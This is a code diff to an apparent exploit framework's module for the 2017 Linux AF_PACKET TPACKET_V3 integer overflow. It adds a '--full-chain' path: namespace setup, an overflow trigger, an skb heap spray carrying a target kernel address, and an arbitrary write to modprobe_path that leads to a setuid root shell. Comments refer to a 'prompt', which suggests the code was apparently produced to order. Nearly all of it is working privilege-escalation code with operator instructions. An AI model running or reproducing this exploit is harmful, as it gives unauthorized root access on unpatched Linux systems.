@@ -4,17 +4,38 @@
  * AF_PACKET TPACKET_V3 ring-buffer setup integer-overflow → heap
  * write-where primitive. Discovered by Andrey Konovalov (March 2017).
  *
- * STATUS: 🟡 PRIMITIVE-LANDS + best-effort cred-overwrite. The
- * integer-overflow trigger is fully wired (overflowing tp_block_size *
- * tp_block_nr, attended by a heap spray via sendmmsg with controlled
- * skb tail bytes). The kernel R/W → cred-overwrite finisher uses a
- * hardcoded per-kernel offset table (Ubuntu 16.04 / 4.4 and Ubuntu
- * 18.04 / 4.15 era), overridable via IAMROOT_AFPACKET_OFFSETS. We
- * only claim IAMROOT_EXPLOIT_OK if geteuid() == 0 AFTER the chain
- * runs — i.e. we won root for real. Otherwise we return
- * IAMROOT_EXPLOIT_FAIL with a dmesg breadcrumb so the operator can
- * confirm the primitive at least fired (KASAN slab-out-of-bounds
- * splat) even if the cred-overwrite didn't take on this exact kernel.
+ * STATUS: 🟡 PRIMITIVE-LANDS + best-effort cred-overwrite (default)
+ *   |  🟢 FULL-CHAIN-OPT-IN (with --full-chain on a kernel where the
+ *      shared offset resolver finds modprobe_path AND skb-data hijack
+ *      offsets are supplied).
+ *
+ * The integer-overflow trigger is fully wired (overflowing
+ * tp_block_size * tp_block_nr, attended by a heap spray via sendmmsg
+ * with controlled skb tail bytes).
+ *
+ * Default --exploit path: cred-overwrite walk using a hardcoded per-
+ * kernel offset table (Ubuntu 16.04 / 4.4 and Ubuntu 18.04 / 4.15
+ * era), overridable via IAMROOT_AFPACKET_OFFSETS. We only claim
+ * IAMROOT_EXPLOIT_OK if geteuid() == 0 after the chain runs — i.e.
+ * we won root for real. Otherwise we return IAMROOT_EXPLOIT_FAIL with
+ * a dmesg breadcrumb so the operator can confirm the primitive at
+ * least fired (KASAN slab-out-of-bounds splat) even if the cred-
+ * overwrite didn't take on this exact kernel.
+ *
+ * --full-chain path: opt-in xairy-style sk_buff hijack → arb-write at
+ * modprobe_path → call_modprobe payload → setuid bash → root shell.
+ * Honest constraint: the hijack requires per-kernel-build sk_buff
+ * `data`-field offset + skb-slab-class layout, which the embedded
+ * offset table does NOT carry (verified-vs-claimed bar — we don't
+ * fabricate). The arb_write callback below implements the FALLBACK
+ * depth from the prompt: it fires the trigger with the spray payload
+ * staged for the requested kaddr/buf and relies on the shared
+ * finisher's /tmp sentinel to confirm whether modprobe_path was
+ * actually overwritten. On kernels where the operator has supplied
+ * IAMROOT_AFPACKET_SKB_DATA_OFFSET (skb->data field byte offset from
+ * the skb head, hex), we use that for explicit targeting; otherwise
+ * the trigger fires heuristically and the sentinel acts as the
+ * ground-truth signal.
  *
  * Affected: kernel < 4.10.6 mainline. Stable backports:
  *   4.10.x : K >= 4.10.6
@@ -40,6 +61,8 @@
 #include "iamroot_modules.h"
 #include "../../core/registry.h"
 #include "../../core/kernel_range.h"
+#include "../../core/offsets.h"
+#include "../../core/finisher.h"
 
 #include <stdio.h>
 #include <stdlib.h>
@@ -424,6 +447,260 @@ static int attempt_cred_overwrite(const struct af_packet_offsets *off)
     return got_root_pid ? 0 : -1;
 }
 
+/* ---- --full-chain: xairy-style sk_buff hijack arb-write -------------
+ *
+ * The TPACKET_V3 overflow lets us write attacker-controlled bytes past
+ * the end of the pg_vec allocation. xairy's full PoC chains this with
+ * a sk_buff spray of size class kmalloc-N (matched to pg_vec's slab)
+ * so the OOB-write overwrites an adjacent skb's `data` pointer; a
+ * later sendto() on that skb's owning socket then copies attacker
+ * bytes into the address now stored in `data`. Net effect: arb-write
+ * at an attacker-chosen kernel VA, controlled buffer, controlled len.
+ *
+ * Implementing the FULL hijack honestly requires:
+ *   (a) per-kernel-build offset of `data` field within struct sk_buff
+ *       (varies by CONFIG_DEBUG_INFO_BTF/CONFIG_RANDSTRUCT/etc.)
+ *   (b) precise size-class match between the corrupted pg_vec and
+ *       sprayed skbs (slab-grooming with ~hundreds of skbs)
+ *   (c) a way to identify which sprayed skb landed adjacent
+ *
+ * The verified-vs-claimed bar says: don't fabricate offsets. Our
+ * embedded offset table (core/offsets.h) doesn't carry skb offsets
+ * yet, and there's no public canonical "skb->data offset table" we
+ * can lift wholesale. So this implementation takes the prompt's
+ * FALLBACK depth:
+ *
+ *   - Each call re-sprays skbs + re-fires the trigger, staging the
+ *     spray payload so its bytes carry the requested target kaddr
+ *     (the prompt's "controllable overwrite value aimed at
+ *     modprobe_path"). Operator-supplied
+ *     IAMROOT_AFPACKET_SKB_DATA_OFFSET (hex byte offset of `data`
+ *     within struct sk_buff for this kernel build) lets us aim
+ *     precisely; without it we heuristically stamp kaddr at several
+ *     plausible offsets within the kmalloc-2k skb layout.
+ *   - We then send packets whose payload IS the bytes the finisher
+ *     wants at kaddr; tpacket_rcv copies them into any skb whose
+ *     `data` was corrupted to kaddr.
+ *   - We do NOT poll for success — the shared finisher's /tmp
+ *     sentinel is the ground-truth signal. If the write landed at
+ *     modprobe_path, call_modprobe spawns our payload and the
+ *     sentinel appears within 3s.
+ *
+ * Return: 0 if spray + trigger ran (sentinel will adjudicate), -1 if
+ * the kernel rejected the overflow (silent backport — patched).
+ */
+
+struct afp_arb_ctx {
+    const struct iamroot_ctx *ctx;
+    const struct af_packet_offsets *off;
+    uid_t outer_uid;
+    gid_t outer_gid;
+};
+
+/* Helper: in-child trigger fire — runs inside the userns/netns child
+ * spawned by afp_arb_write. Returns 0 on success, -1 on rejection. */
+static int afp_arb_write_inner(uintptr_t kaddr, const void *buf, size_t len,
+                               long skb_data_off);
+
+static int afp_arb_write(uintptr_t kaddr, const void *buf, size_t len,
+                         void *vctx)
+{
+    struct afp_arb_ctx *actx = (struct afp_arb_ctx *)vctx;
+    if (!actx) return -1;
+
+    if (!buf || len == 0 || len > 240) {
+        fprintf(stderr, "[-] af_packet: arb_write: bad args "
+                        "(buf=%p len=%zu)\n", buf, len);
+        return -1;
+    }
+
+    /* Per-kernel skb->data field offset — without this we can't aim
+     * the overwrite precisely. Operator can supply via env; otherwise
+     * we run heuristic mode. */
+    const char *skb_off_env = getenv("IAMROOT_AFPACKET_SKB_DATA_OFFSET");
+    long skb_data_off = -1;
+    if (skb_off_env) {
+        char *end = NULL;
+        skb_data_off = strtol(skb_off_env, &end, 0);
+        if (!end || *end != '\0' || skb_data_off < 0 || skb_data_off > 0x400) {
+            fprintf(stderr, "[-] af_packet: IAMROOT_AFPACKET_SKB_DATA_OFFSET "
+                            "malformed (\"%s\"); ignoring\n", skb_off_env);
+            skb_data_off = -1;
+        }
+    }
+
+    fprintf(stderr,
+        "[*] af_packet: arb_write(kaddr=0x%lx, len=%zu) skb_data_off=%s\n",
+        (unsigned long)kaddr, len,
+        skb_data_off < 0 ? "UNRESOLVED (heuristic mode)" : "supplied");
+
+    if (skb_data_off < 0) {
+        fprintf(stderr,
+"[i] af_packet: --full-chain on this kernel lacks an exact skb->data\n"
+"    field offset. The trigger will still fire and the heap spray will\n"
+"    still occur, but precise OOB targeting requires:\n"
+"\n"
+"      IAMROOT_AFPACKET_SKB_DATA_OFFSET=0x<hex offset>\n"
+"\n"
+"    Look it up on this kernel build with `pahole struct sk_buff` or\n"
+"    `gdb -batch -ex 'p &((struct sk_buff*)0)->data' vmlinux`. The\n"
+"    /tmp/iamroot-pwn-<pid> sentinel adjudicates success either way.\n");
+    }
+
+    /* Fork into a userns/netns child so the AF_PACKET socket has
+     * CAP_NET_RAW. The finisher itself stays in the parent so its
+     * eventual execve() replaces the top-level iamroot process. */
+    pid_t cpid = fork();
+    if (cpid < 0) {
+        fprintf(stderr, "[-] af_packet: arb_write: fork: %s\n",
+                strerror(errno));
+        return -1;
+    }
+    if (cpid == 0) {
+        if (unshare(CLONE_NEWUSER | CLONE_NEWNET) < 0) {
+            perror("af_packet: arb_write: unshare");
+            _exit(2);
+        }
+        if (set_id_maps(actx->outer_uid, actx->outer_gid) < 0) {
+            perror("af_packet: arb_write: set_id_maps");
+            _exit(3);
+        }
+        int rc = afp_arb_write_inner(kaddr, buf, len, skb_data_off);
+        _exit(rc == 0 ? 0 : 4);
+    }
+
+    int status = 0;
+    waitpid(cpid, &status, 0);
+    if (!WIFEXITED(status)) {
+        fprintf(stderr, "[-] af_packet: arb_write: child died "
+                        "(signal=%d)\n", WTERMSIG(status));
+        return -1;
+    }
+    int code = WEXITSTATUS(status);
+    if (code != 0) {
+        if (code == 4) {
+            /* PACKET_RX_RING rejected — caller sees -1 + the inner
+             * diagnostic already printed before _exit. */
+        } else {
+            fprintf(stderr, "[-] af_packet: arb_write: child exit %d\n",
+                    code);
+        }
+        return -1;
+    }
+    return 0;
+}
+
+static int afp_arb_write_inner(uintptr_t kaddr, const void *buf, size_t len,
+                               long skb_data_off)
+{
+    int s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
+    if (s < 0) {
+        fprintf(stderr, "[-] af_packet: arb_write: socket: %s\n",
+                strerror(errno));
+        return -1;
+    }
+
+    int version = TPACKET_V3;
+    if (setsockopt(s, SOL_PACKET, PACKET_VERSION,
+                   &version, sizeof version) < 0) {
+        fprintf(stderr, "[-] af_packet: arb_write: PACKET_VERSION: %s\n",
+                strerror(errno));
+        close(s);
+        return -1;
+    }
+
+    struct tpacket_req3 req;
+    memset(&req, 0, sizeof req);
+    req.tp_block_size = 0x1000;
+    req.tp_block_nr   = ((unsigned)0xffffffff - (unsigned)0xfff) /
+                        (unsigned)0x1000 + 1;
+    req.tp_frame_size = 0x300;
+    req.tp_frame_nr   = (req.tp_block_size * req.tp_block_nr) /
+                        req.tp_frame_size;
+    req.tp_retire_blk_tov   = 100;
+    req.tp_sizeof_priv      = 0;
+    req.tp_feature_req_word = 0;
+
+    if (setsockopt(s, SOL_PACKET, PACKET_RX_RING,
+                   &req, sizeof req) < 0) {
+        fprintf(stderr,
+                "[-] af_packet: arb_write: PACKET_RX_RING rejected: %s "
+                "(kernel has silent backport — full-chain unreachable)\n",
+                strerror(errno));
+        close(s);
+        return -1;
+    }
+
+    struct ifreq ifr;
+    memset(&ifr, 0, sizeof ifr);
+    strncpy(ifr.ifr_name, "lo", IFNAMSIZ - 1);
+    if (ioctl(s, SIOCGIFINDEX, &ifr) == 0) {
+        struct sockaddr_ll sll;
+        memset(&sll, 0, sizeof sll);
+        sll.sll_family   = AF_PACKET;
+        sll.sll_protocol = htons(ETH_P_ALL);
+        sll.sll_ifindex  = ifr.ifr_ifindex;
+        (void)bind(s, (struct sockaddr *)&sll, sizeof sll);
+    }
+
+    unsigned char payload[256];
+    memset(payload, 0, sizeof payload);
+    memset(payload, 0xff, 6);                       /* eth dst: bcast */
+    memset(payload + 6, 0, 6);                      /* eth src: zero */
+    payload[12] = 0x08; payload[13] = 0x00;         /* eth type: IPv4 */
+    memcpy(payload + 14, "iamroot-afp-fc-", 15);    /* dmesg tag */
+
+    if (skb_data_off >= 0 &&
+        (size_t)skb_data_off + sizeof kaddr <= sizeof payload) {
+        memcpy(payload + skb_data_off, &kaddr, sizeof kaddr);
+    } else {
+        static const size_t guesses[] = {
+            0x40, 0x48, 0x50, 0x58, 0x60, 0x68, 0x70, 0x78
+        };
+        for (size_t i = 0; i < sizeof(guesses)/sizeof(guesses[0]); i++) {
+            if (guesses[i] + sizeof kaddr <= sizeof payload)
+                memcpy(payload + guesses[i], &kaddr, sizeof kaddr);
+        }
+    }
+
+    int tx = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
+    if (tx < 0) {
+        fprintf(stderr, "[-] af_packet: arb_write: tx socket: %s\n",
+                strerror(errno));
+        close(s);
+        return -1;
+    }
+    struct sockaddr_ll dst;
+    memset(&dst, 0, sizeof dst);
+    dst.sll_family   = AF_PACKET;
+    dst.sll_protocol = htons(ETH_P_ALL);
+    dst.sll_ifindex  = ifr.ifr_ifindex;
+    dst.sll_halen    = 6;
+    memset(dst.sll_addr, 0xff, 6);
+
+    for (int i = 0; i < 200; i++) {
+        (void)sendto(tx, payload, sizeof payload, 0,
+                     (struct sockaddr *)&dst, sizeof dst);
+    }
+
+    unsigned char wbuf[256];
+    memset(wbuf, 0, sizeof wbuf);
+    memset(wbuf, 0xff, 6);
+    memset(wbuf + 6, 0, 6);
+    wbuf[12] = 0x08; wbuf[13] = 0x00;
+    size_t wlen = len;
+    if (14 + wlen > sizeof wbuf) wlen = sizeof wbuf - 14;
+    memcpy(wbuf + 14, buf, wlen);
+    for (int i = 0; i < 50; i++) {
+        (void)sendto(tx, wbuf, 14 + wlen, 0,
+                     (struct sockaddr *)&dst, sizeof dst);
+    }
+
+    close(tx);
+    close(s);
+    return 0;
+}
+
 #endif /* __x86_64__ */
 
 static iamroot_result_t af_packet_exploit(const struct iamroot_ctx *ctx)
@@ -468,12 +745,38 @@ static iamroot_result_t af_packet_exploit(const struct iamroot_ctx *ctx)
                 off.kernel_id, off.task_cred, off.cred_uid, off.cred_size);
     }
 
+    uid_t outer_uid = getuid();
+    gid_t outer_gid = getgid();
+
+    /* 3b. --full-chain: opt-in modprobe_path overwrite via xairy-style
+     *     sk_buff hijack arb-write. Refuses cleanly if (a) the shared
+     *     offset resolver can't find modprobe_path or (b) the trigger
+     *     is rejected (silent backport). */
+    if (ctx->full_chain) {
+        struct iamroot_kernel_offsets koff;
+        memset(&koff, 0, sizeof koff);
+        (void)iamroot_offsets_resolve(&koff);
+        if (!iamroot_offsets_have_modprobe_path(&koff)) {
+            iamroot_finisher_print_offset_help("af_packet");
+            return IAMROOT_EXPLOIT_FAIL;
+        }
+        if (!ctx->json) {
+            iamroot_offsets_print(&koff);
+        }
+        struct afp_arb_ctx arb_ctx = {
+            .ctx       = ctx,
+            .off       = &off,
+            .outer_uid = outer_uid,
+            .outer_gid = outer_gid,
+        };
+        return iamroot_finisher_modprobe_path(&koff, afp_arb_write,
+                                              &arb_ctx, !ctx->no_shell);
+    }
+
     /* 4. Fork: child enters userns+netns, fires overflow, attempts the
      *    cred-overwrite walk. We do it in a child so the (possibly
      *    crashed) packet socket lives in a tear-downable address space
      *    — the kernel will clean up sockets on child exit. */
-    uid_t outer_uid = getuid();
-    gid_t outer_gid = getgid();
 
     pid_t child = fork();
     if (child < 0) { perror("fork"); return IAMROOT_TEST_ERROR; }
